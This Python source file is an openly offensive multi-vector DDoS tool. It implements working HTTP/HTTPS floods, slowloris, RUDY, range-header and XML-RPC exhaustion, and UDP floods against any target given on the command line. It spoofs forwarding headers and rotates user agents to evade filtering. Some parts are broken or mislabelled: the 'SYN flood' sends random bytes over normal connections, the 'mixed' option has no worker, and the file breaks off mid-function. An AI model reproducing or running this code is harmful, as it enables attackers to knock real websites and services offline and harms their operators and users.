#!/usr/bin/env python3
"""
Advanced Universal DDoS Engine - Multi-Vector Attack Framework
Production-Grade Implementation with Error Handling, Validation, and Adaptive Attack Patterns
"""

import socket
import ssl
import threading
import random
import time
import sys
import os
import struct
import hashlib
import urllib.parse
import json
import queue
import signal
import traceback
import ipaddress
import re
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque
from datetime import datetime
from enum import Enum
import logging
from logging.handlers import RotatingFileHandler

# ==================== CONFIGURATION ====================
class AttackConfig:
    def __init__(self):
        self.debug = False
        self.log_file = "ddos_engine.log"
        self.max_log_size = 10 * 1024 * 1024  # 10MB
        self.backup_count = 5
        
config = AttackConfig()

# ==================== LOGGING SETUP ====================
def setup_logging():
    logger = logging.getLogger('DDOSEngine')
    logger.setLevel(logging.DEBUG if config.debug else logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - [%(levelname)s] - %(threadName)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler = RotatingFileHandler(
        config.log_file, 
        maxBytes=config.max_log_size,
        backupCount=config.backup_count
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# ==================== ATTACK VECTORS ====================
class AttackVector(Enum):
    HTTP_FLOOD = "http_flood"
    HTTPS_FLOOD = "https_flood"
    SLOWLORIS = "slowloris"
    TCP_SYN = "tcp_syn"
    UDP_FLOOD = "udp_flood"
    ICMP_FLOOD = "icmp_flood"
    HTTP_POST = "http_post"
    RUDY = "rudy"
    RANGE_HEADER = "range_header"
    XMLRPC = "xmlrpc"
    WEBSOCKET = "websocket"
    MIXED = "mixed"

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    def __init__(self):
        self._init_data()
        
    def _init_data(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
        ]
        
        self.referers = [
            "https://www.google.com/search?q=",
            "https://www.bing.com/search?q=",
            "https://search.yahoo.com/search?p=",
            "https://duckduckgo.com/?q=",
            "https://www.baidu.com/s?wd=",
            "https://yandex.com/search/?text=",
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.reddit.com/",
            "https://www.youtube.com/"
        ]
        
        self.accept_languages = [
            "en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.9", "de-DE,de;q=0.9",
            "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "pt-BR,pt;q=0.9",
            "it-IT,it;q=0.9", "ko-KR,ko;q=0.9", "ar-SA,ar;q=0.9"
        ]
        
        self.paths = [
            "/", "/api", "/login", "/admin", "/search", "/index.html", 
            "/wp-admin", "/wp-login.php", "/xmlrpc.php", "/api/v1/users",
            "/graphql", "/.env", "/config", "/backup", "/test"
        ]
    
    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    def random_string(self, length=10):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def random_bytes(self, size):
        return os.urandom(size)
    
    def generate_http_packet(self, host, port, path=None, method=None):
        if not method:
            method = random.choice(["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"])
        
        if not path:
            path = random.choice(self.paths)
        
        if port not in [80, 443]:
            host_header = f"{host}:{port}"
        else:
            host_header = host
        
        params = {}
        for _ in range(random.randint(1, 5)):
            params[self.random_string(5)] = self.random_string(8)
        
        if params:
            path = f"{path}?{urllib.parse.urlencode(params)}"
        
        headers = {
            "Host": host_header,
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(self.accept_languages),
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": random.choice(self.referers) + self.random_string(8),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Connection": random.choice(["keep-alive", "close", "Keep-Alive"]),
            "X-Forwarded-For": self.random_ip(),
            "X-Real-IP": self.random_ip(),
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": f"session={hashlib.md5(self.random_string(10).encode()).hexdigest()}",
            "DNT": random.choice(["0", "1"]),
        }
        
        body = ""
        if method in ["POST", "PUT", "PATCH"]:
            content_type = random.choice([
                "application/x-www-form-urlencoded",
                "application/json",
                "text/plain"
            ])
            headers["Content-Type"] = content_type
            
            if content_type == "application/json":
                body = json.dumps({self.random_string(8): self.random_string(20) for _ in range(random.randint(1, 10))})
            else:
                body = urllib.parse.urlencode({self.random_string(8): self.random_string(20) for _ in range(random.randint(1, 10))})
            
            headers["Content-Length"] = str(len(body))
        
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        packet = f"{request_line}{header_lines}\r\n\r\n{body}"
        
        return packet.encode()
    
    def generate_slowloris_packet(self, host, port):
        if port not in [80, 443]:
            host_header = f"{host}:{port}"
        else:
            host_header = host
        
        packet = (
            f"GET /{self.random_string(8)} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: {random.choice(self.accept_languages)}\r\n"
            f"Connection: keep-alive\r\n"
            f"X-a: {self.random_string(random.randint(100, 5000))}\r\n"
        )
        return packet.encode()
    
    def generate_rudy_packet(self, host, port):
        if port not in [80, 443]:
            host_header = f"{host}:{port}"
        else:
            host_header = host
        
        content_length = random.randint(1000000, 5000000)
        packet = (
            f"POST /{self.random_string(8)} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"a=1"
        )
        return packet.encode(), content_length
    
    def generate_range_header_packet(self, host, port):
        if port not in [80, 443]:
            host_header = f"{host}:{port}"
        else:
            host_header = host
        
        range_count = random.randint(100, 1000)
        ranges = ",".join([f"bytes={i}-{i+random.randint(1,100)}" for i in range(0, range_count * 1000, 1000)])
        
        packet = (
            f"GET /{self.random_string(8)} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Range: {ranges}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        return packet.encode()
    
    def generate_tcp_syn_packet(self):
        packet = self.random_bytes(random.randint(64, 1500))
        return packet
    
    def generate_udp_packet(self, size=None):
        if not size:
            size = random.randint(500, 1400)
        return self.random_bytes(size)
    
    def generate_xmlrpc_packet(self, host, port):
        if port not in [80, 443]:
            host_header = f"{host}:{port}"
        else:
            host_header = host
        
        method_names = [
            "system.listMethods", "system.methodSignature", "system.methodHelp",
            "wp.getUsersBlogs", "wp.getPost", "demo.sayHello"
        ]
        
        xml_body = f"""<?xml version="1.0"?>
        <methodCall>
          <methodName>{random.choice(method_names)}</methodName>
          <params>
            <param><value><string>{self.random_string(1000)}</string></value></param>
          </params>
        </methodCall>"""
        
        packet = (
            f"POST /xmlrpc.php HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {random.choice(self.user_agents)}\r\n"
            f"Content-Type: text/xml\r\n"
            f"Content-Length: {len(xml_body)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{xml_body}"
        )
        return packet.encode()

# ==================== TARGET VALIDATOR ====================
class TargetValidator:
    @staticmethod
    def validate_target(target):
        """Validate and resolve target"""
        try:
            ipaddress.ip_address(target)
            return target, True
        except ValueError:
            pass
        
        try:
            ipaddress.ip_network(target, strict=False)
            return target, True
        except ValueError:
            pass
        
        if TargetValidator.is_valid_hostname(target):
            try:
                resolved_ip = socket.gethostbyname(target)
                logger.info(f"[+] Resolved {target} to {resolved_ip}")
                return resolved_ip, False
            except socket.gaierror as e:
                logger.error(f"[-] Failed to resolve {target}: {e}")
                return None, False
        
        logger.error(f"[-] Invalid target: {target}")
        return None, False
    
    @staticmethod
    def is_valid_hostname(hostname):
        if len(hostname) > 255:
            return False
        allowed = re.compile(r"(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
        return all(allowed.match(x) for x in hostname.split("."))

# ==================== CONNECTION POOL ====================
class ConnectionPool:
    def __init__(self, target, port, use_ssl=False, max_connections=1000):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.max_connections = max_connections
        self.pool = queue.Queue(maxsize=max_connections)
        self.lock = threading.Lock()
        self.active_connections = 0
        
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            return sock
        except Exception as e:
            logger.debug(f"Connection creation failed: {e}")
            return None
    
    def get_connection(self):
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            with self.lock:
                if self.active_connections < self.max_connections:
                    conn = self.create_connection()
                    if conn:
                        self.active_connections += 1
                        return conn
            return None
    
    def return_connection(self, conn):
        if conn:
            try:
                self.pool.put_nowait(conn)
            except queue.Full:
                try:
                    conn.close()
                except:
                    pass
                with self.lock:
                    self.active_connections -= 1
    
    def close_all(self):
        while not self.pool.empty():
            try:
                conn = self.pool.get_nowait()
                conn.close()
            except:
                pass

# ==================== STATISTICS COLLECTOR ====================
class StatsCollector:
    def __init__(self):
        self.stats = defaultdict(int)
        self.errors = defaultdict(int)
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.response_times = deque(maxlen=1000)
        self.success_rate = deque(maxlen=100)
        
    def record_success(self, vector):
        with self.lock:
            self.stats['total_success'] += 1
            self.stats[f'{vector}_success'] += 1
            self.success_rate.append(1)
    
    def record_failure(self, vector, error_type):
        with self.lock:
            self.stats['total_failures'] += 1
            self.stats[f'{vector}_failures'] += 1
            self.errors[f'{error_type}'] += 1
            self.success_rate.append(0)
    
    def record_response_time(self, response_time):
        with self.lock:
            self.response_times.append(response_time)
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            total_attempts = self.stats['total_success'] + self.stats['total_failures']
            
            success_rate = 0
            if self.success_rate:
                success_rate = sum(self.success_rate) / len(self.success_rate) * 100
            
            avg_response_time = 0
            if self.response_times:
                avg_response_time = sum(self.response_times) / len(self.response_times)
            
            rate = total_attempts / elapsed if elapsed > 0 else 0
            
            return {
                'elapsed': elapsed,
                'total_attempts': total_attempts,
                'total_success': self.stats['total_success'],
                'total_failures': self.stats['total_failures'],
                'rate': rate,
                'success_rate': success_rate,
                'avg_response_time': avg_response_time,
                'errors': dict(self.errors)
            }

# ==================== ATTACK EXECUTOR ====================
class AttackExecutor:
    def __init__(self, target, port, use_ssl=False, threads=500, duration=60):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.threads = threads
        self.duration = duration
        self.running = True
        self.payload_gen = PayloadGenerator()
        self.stats = StatsCollector()
        self.connection_pools = {}
        self.thread_pool = None
        
    def _get_connection_pool(self, vector_name):
        if vector_name not in self.connection_pools:
            self.connection_pools[vector_name] = ConnectionPool(
                self.target, self.port, self.use_ssl, max_connections=self.threads // 2
            )
        return self.connection_pools[vector_name]
    
    def _test_target_reachability(self):
        """Test if target is reachable before launching attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result == 0:
                logger.info(f"[+] Target {self.target}:{self.port} is reachable")
                return True
            else:
                logger.error(f"[-] Target {self.target}:{self.port} is NOT reachable (error: {result})")
                return False
        except Exception as e:
            logger.error(f"[-] Target reachability test failed: {e}")
            return False
    
    def _http_flood_worker(self, thread_id):
        """HTTP flood attack worker"""
        logger.debug(f"[Thread-{thread_id}] HTTP flood worker started")
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 50:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(5)
                
                start_connect = time.time()
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                for _ in range(random.randint(5, 20)):
                    if not self.running:
                        break
                    
                    packet = self.payload_gen.generate_http_packet(
                        self.target, self.port,
                        path=random.choice(self.payload_gen.paths),
                        method=random.choice(["GET", "POST", "HEAD"])
                    )
                    
                    start_send = time.time()
                    sock.send(packet)
                    
                    try:
                        sock.settimeout(1)
                        response = sock.recv(4096)
                        response_time = time.time() - start_send
                        self.stats.record_response_time(response_time)
                        self.stats.record_success('http')
                        consecutive_errors = 0
                    except socket.timeout:
                        self.stats.record_success('http')
                        consecutive_errors = 0
                
                sock.close()
                
            except (socket.error, ssl.SSLError, ConnectionError) as e:
                consecutive_errors += 1
                error_type = type(e).__name__
                self.stats.record_failure('http', error_type)
                
                if consecutive_errors >= 50:
                    logger.debug(f"[Thread-{thread_id}] Too many consecutive errors, stopping")
                    break
                
                time.sleep(random.uniform(0.01, 0.1))
            except Exception as e:
                logger.error(f"[Thread-{thread_id}] Unexpected error: {e}\n{traceback.format_exc()}")
                consecutive_errors += 1
                time.sleep(0.1)
    
    def _slowloris_worker(self, thread_id):
        """Slowloris attack worker"""
        logger.debug(f"[Thread-{thread_id}] Slowloris worker started")
        sockets_list = []
        max_sockets_per_thread = min(100, self.threads // 5)
        
        # Initial connection phase
        for i in range(max_sockets_per_thread):
            if not self.running:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                initial_packet = self.payload_gen.generate_slowloris_packet(self.target, self.port)
                sock.send(initial_packet)
                sockets_list.append(sock)
                self.stats.record_success('slowloris')
                
            except Exception as e:
                self.stats.record_failure('slowloris', type(e).__name__)
                time.sleep(random.uniform(0.1, 0.5))
        
        # Keep-alive phase
        while self.running and sockets_list:
            for sock in list(sockets_list):
                if not self.running:
                    break
                
                try:
                    keep_alive = f"X-a: {self.payload_gen.random_string(random.randint(10, 100))}\r\n"
                    sock.send(keep_alive.encode())
                    self.stats.record_success('slowloris')
                    
                except Exception as e:
                    self.stats.record_failure('slowloris', type(e).__name__)
                    try:
                        sock.close()
                    except:
                        pass
                    sockets_list.remove(sock)
            
            # Maintain connection pool
            while len(sockets_list) < max_sockets_per_thread and self.running:
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    new_sock.settimeout(10)
                    new_sock.connect((self.target, self.port))
                    
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        new_sock = context.wrap_socket(new_sock, server_hostname=self.target)
                    
                    new_sock.send(self.payload_gen.generate_slowloris_packet(self.target, self.port))
                    sockets_list.append(new_sock)
                    self.stats.record_success('slowloris')
                    
                except Exception as e:
                    self.stats.record_failure('slowloris', type(e).__name__)
                    break
            
            time.sleep(random.uniform(1, 5))
        
        # Cleanup
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
    
    def _udp_flood_worker(self, thread_id):
        """UDP flood attack worker"""
        logger.debug(f"[Thread-{thread_id}] UDP flood worker started")
        consecutive_errors = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.1)
        except Exception as e:
            logger.error(f"[Thread-{thread_id}] Failed to create UDP socket: {e}")
            return
        
        while self.running and consecutive_errors < 100:
            try:
                # Burst send
                for _ in range(random.randint(10, 50)):
                    if not self.running:
                        break
                    
                    packet = self.payload_gen.generate_udp_packet(
                        size=random.randint(500, 1500)
                    )
                    sock.sendto(packet, (self.target, self.port))
                    self.stats.record_success('udp')
                    consecutive_errors = 0
                
                time.sleep(0.001)
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('udp', type(e).__name__)
                
                if consecutive_errors >= 100:
                    logger.debug(f"[Thread-{thread_id}] Too many UDP errors")
                    break
        
        try:
            sock.close()
        except:
            pass
    
    def _tcp_syn_worker(self, thread_id):
        """TCP SYN flood worker (requires raw sockets)"""
        logger.debug(f"[Thread-{thread_id}] TCP SYN worker started")
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 50:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(0.5)
                
                try:
                    sock.connect((self.target, self.port))
                except:
                    pass
                
                try:
                    sock.send(self.payload_gen.generate_tcp_syn_packet())
                    self.stats.record_success('tcp_syn')
                    consecutive_errors = 0
                except:
                    self.stats.record_failure('tcp_syn', 'send_failed')
                    consecutive_errors += 1
                
                try:
                    sock.close()
                except:
                    pass
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('tcp_syn', type(e).__name__)
                time.sleep(0.001)
    
    def _rudy_worker(self, thread_id):
        """R.U.D.Y (R U Dead Yet) attack worker"""
        logger.debug(f"[Thread-{thread_id}] RUDY worker started")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                initial_packet, total_bytes = self.payload_gen.generate_rudy_packet(self.target, self.port)
                sock.send(initial_packet)
                
                bytes_sent = 2
                while bytes_sent < total_bytes and self.running:
                    chunk_size = random.randint(1, 10)
                    sock.send(b"&" + self.payload_gen.random_string(chunk_size).encode())
                    bytes_sent += chunk_size + 1
                    time.sleep(random.uniform(1, 10))
                
                self.stats.record_success('rudy')
                
            except Exception as e:
                self.stats.record_failure('rudy', type(e).__name__)
                time.sleep(random.uniform(1, 5))
    
    def _range_header_worker(self, thread_id):
        """Range header attack worker"""
        logger.debug(f"[Thread-{thread_id}] Range header worker started")
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                packet = self.payload_gen.generate_range_header_packet(self.target, self.port)
                sock.send(packet)
                
                try:
                    response = sock.recv(4096)
                    self.stats.record_response_time(time.time())
                except:
                    pass
                
                self.stats.record_success('range_header')
                consecutive_errors = 0
                sock.close()
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('range_header', type(e).__name__)
                time.sleep(random.uniform(0.1, 1))
    
    def _xmlrpc_worker(self, thread_id):
        """XML-RPC attack worker"""
        logger.debug(f"[Thread-{thread_id}] XMLRPC worker started")
        consecutive_errors = 0
        
        while self.running and consecutive_errors < 30:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                for _ in range(random.randint(1, 5)):
                    packet = self.payload_gen.generate_xmlrpc_packet(self.target, self.port)
                    sock.send(packet)
                    self.stats.record_success('xmlrpc')
                
                sock.close()
                consecutive_errors = 0
                
            except Exception as e:
                consecutive_errors += 1
                self.stats.record_failure('xmlrpc', type(e).__name__)
                time.sleep(random.uniform(0.1, 1))
    
    def _stats_reporter(self):
        """Statistics reporting thread"""
        while self.running:
            stats = self.stats.get_stats()
            
            error_summary = ""
            if stats['errors']:
                top_errors = sorted(stats['errors'].items(), key=lambda x: x[1], reverse=True)[:3]
                error_summary = " | Errors: " + ", ".join([f"{k}:{v}" for k, v in top_errors])
            
            sys.stdout.write(
                f"\r[+] {datetime.now().strftime('%H:%M:%S')} | "
                f"Running: {stats['elapsed']:.0f}s | "
                f"Attempts: {stats['total_attempts']} | "
                f"Rate: {stats['rate']:.0f}/s | "
                f"Success: {stats['success_rate']:.1f}% | "
                f"Avg RT: {stats['avg_response_time']*1000:.1f}ms"
                f"{error_summary}                    "
            )
            sys.stdout.flush()
            
            time.sleep(1)
    
    def launch_attack(self, vector):
        """Launch specific attack vector"""
        logger.info(f"[!] Testing target reachability...")
        if not self._test_target_reachability():
            logger.error("[-] Target unreachable, attack aborted")
            return
        
        logger.info(f"[!] Starting {vector.value} attack on {self.target}:{self.port}")
        logger.info(f"[!] Threads: {self.threads} | Duration: {self.duration}s | SSL: {self.use_ssl}")
        
        # Start stats reporter
        reporter_thread = threading.Thread(target=self._stats_reporter, daemon=True)
        reporter_thread.start()
        
        # Select worker function
        workers = {
            AttackVector.HTTP_FLOOD: self._http_flood_worker,
            AttackVector.HTTPS_FLOOD: self._http_flood_worker,
            AttackVector.SLOWLORIS: self._slowloris_worker,
            AttackVector.TCP_SYN: self._tcp_syn_worker,
            AttackVector.UDP_FLOOD: self._udp_flood_worker,
            AttackVector.RUDY: self._rudy_worker,
            AttackVector.RANGE_HEADER: self._range_header_worker,
            AttackVector.XMLRPC: self._xmlrpc_worker,
        }
        
        worker_func = workers.get(vector)
        if not worker_func:
            logger.error(f"[-] Unknown attack vector: {vector}")
            return
        
        # Launch worker threads
        thread_list = []
        for i in range(self.threads):
            thread = threading.Thread(target=worker_func, args=(i,), daemon=True)
            thread.start()
            thread_list.append(thread)
        
        # Wait for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        finally:
            self.running = False
            
            # Wait for threads to finish
            for thread in thread_list:
                thread.join(timeout=1)
            
            # Cleanup connection pools
            for pool in self.connection_pools.values():
                pool.close_all()
        
        # Final statistics
        stats = self.stats.get_stats()
        logger.info(f"\n[!] Attack completed")
        logger.info(f"[!] Duration: {stats['elapsed']:.2f}s")
        logger.info(f"[!] Total attempts: {stats['total_attempts']}")
        logger.info(f"[!] Success rate: {stats['success_rate']:.1f}%")
        logger.info(f"[!] Average rate: {stats['rate']:.0f} packets/s")
        logger.info(f"[!] Average response time: {stats['avg_response_time']*1000:.1f}ms")
        
        if stats['errors']:
            logger.info("[!] Top errors:")
            for error_type, count in sorted(stats['errors'].items(), key=lambda x: x[1], reverse=True)[:5]:
                logger.info(f"    - {error_type}: {count}")
        
        return stats

# ==================== MAIN CONTROLLER ====================
class DDoSController:
    def __init__(self):
        self.running = True
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        logger.info("\n[!] Received interrupt signal, shutting down...")
        self.running = False
    
    def parse_args(self):
        if len(sys.argv) < 2:
            self._print_usage()
            sys.exit(1)
        
        import argparse
        parser = argparse.ArgumentParser(
            description="Advanced Universal DDoS Engine",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  python3 ddos_engine.py example.com
  python3 ddos_engine.py 192.168.1.1 -p 443 -s -v slowloris
  python3 ddos_engine.py target.com -t 1000 -d 300 -v mixed
  python3 ddos_engine.py 10.0.0.1 -p 8080 -v udp -t 2000
  python3 ddos_engine.py target.com -v http_flood,rudy,xmlrpc
            """
        )
        
        parser.add_argument('target', help='Target URL or IP address')
        parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
        parser.add_argument('-t', '--threads', type=int, default=500, help='Number of threads (default: 500)')
        parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
        parser.add_argument('-s', '--ssl', action='store_true', help='Use HTTPS/SSL connection')
        parser.add_argument('-v', '--vector', type=str, default='http_flood', 
                           help='Attack vector (default: http_flood). Available: http_flood, slowloris, tcp_syn, udp_flood, rudy, range_header, xmlrpc, mixed')
        parser.add_argument('--debug', action='store_true', help='Enable debug logging')
        
        return parser.parse_args()
    
    def _print_usage(self):
        print("""
╔══════════════════════════════════════════════════════════════╗
║           ADVANCED UNIVERSAL DDoS ENGINE v2.0                ║
║         Multi-Vector Attack Framework                        ║
╚══════════════════════════════════════════════════════════════╝

Usage: python3 ddos_engine.py <target> [options]

Required:
  target                    Target URL or IP address

Options:
  -p, --port PORT          Target port (default: 80)
  -t, --threads N          Number of threads (default: 500)
  -d, --duration SECONDS   Attack duration (default: 60)
  -s, --ssl                Use HTTPS/SSL
  -v, --vector VECTOR      Attack vector (default: http_flood)
  --debug                  Enable debug logging

Available Attack Vectors:
  http_flood    - HTTP/HTTPS GET/POST flood with randomization
  slowloris     - Slowloris connection exhaustion
  tcp_syn       - TCP SYN flood
  udp_flood     - UDP packet flood
  rudy          - R.U.D.Y (R U Dead Yet) slow POST
  range_header  - Range header resource exhaustion
  xmlrpc        - XML-RPC amplification attack
  mixed         - Random combination of all vectors

Examples:
  python3 ddos_http.py example.com
  python3 ddos_http.py 192.168.1.1 -p 443 -s -v slowloris
  python3 dddos_http.py target.com -t 1000 -d 300 -v mixed
        """)
    
    def run(self):
        args = self.parse_args()
        
        if args.debug:
            config.debug = True
            logger.setLevel(logging.DEBUG)
        
        # Validate target
        target, is_ip = TargetValidator.validate_target(args.target)
        if not target:
            sys.exit(1)
        
        # Parse attack vector
        vector_map = {
            'http_flood': AttackVector.HTTP_FLOOD,
            'https_flood': AttackVector.HTTPS_FLOOD,
            'slowloris': AttackVector.SLOWLORIS,
            'tcp_syn': AttackVector.TCP_SYN,
            'udp_flood': AttackVector.UDP_FLOOD,
            'rudy': AttackVector.RUDY,
            'range_header': AttackVector.RANGE_HEADER,
            'xmlrpc': AttackVector.XMLRPC,
            'mixed': AttackVector.MIXED,
        }
        
        vector = vector_map.get(args.vector.lower())
        if not vector:
            logger.error(f"[-] Unknown attack vector: {args.vector}")
            logger.info(f"[!] Available vectors: {', '.join(vector_map.keys())}")
            sys.exit(1)
        
        # Setup SSL
        use_ssl = args.ssl or args.port == 443
        
        # Create executor and launch
        executor = AttackExecutor(
            target=target,
            port=args.port,
            use_ssl=use_ssl,
            threads=args.threads,
            duration=args.duration
        )
        
